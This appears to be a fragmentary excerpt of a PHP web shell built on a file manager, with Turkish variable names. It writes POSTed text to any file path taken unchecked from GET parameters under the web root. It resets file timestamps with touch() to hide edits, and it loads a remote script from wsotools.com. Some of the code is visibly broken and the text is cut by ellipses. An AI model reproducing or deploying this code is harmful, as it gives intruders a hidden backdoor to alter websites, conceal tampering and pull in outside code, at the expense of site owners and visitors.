...
<input type="text" name="tarih" value="<?php echo date("Y-m-d H:i:s", filemtime(fm_enc(fm_convert_win($file_path))));?>"><button type="submit">></button>
        ...
        <p>
			...
			<b><button type="submit" class="btn btn-info"><i class="icon-save"></i> Update</button></b>
        </p>
        <?php
        if ($is_zip) {
            // ZIP content
            ...
            if (FM_USE_HIGHLIGHTJS) {
                ...
                $content = '<pre class="with-hljs"><textarea id="demotext" name="yaz" class="' . $hljs_class . '">' . fm_enc($content) . '</textarea></pre></form>';
...
$root_path = $_SERVER['DOCUMENT_ROOT'];
				if($_GET["p"]!=Null){
				$dosya = fopen($root_path."/".$_GET["p"]."/".$_GET["view"],'w');
				}
				else{
				$dosya = fopen($root_path."/".$_GET["view"],'w');
				}
 fwrite($dosya, $_POST["yaz"]);
fclose($dosya);
 header("Refresh:0"); 
?>
<script type="text/javascript">

 window.location.assign("?p=<?php echo $_GET["p"];?>&view=?php echo $_GET["view"];?");
...
<?php
			...
			if(@$_POST["tarih"]!=Null){
		$tarih=strtotime($_POST["tarih"]);
$root_path = $_SERVER['DOCUMENT_ROOT'];
				if($_GET["p"]!=Null){
				touch($root_path."/".$_GET["p"]."/".$_GET["view"], $tarih);
				}
				else{
				touch($root_path."/".$_GET["view"], $tarih);
				}
 header("Refresh:0"); 
?>
<script type="text/javascript">
...
<script src="https://wsotools.com/wp.js">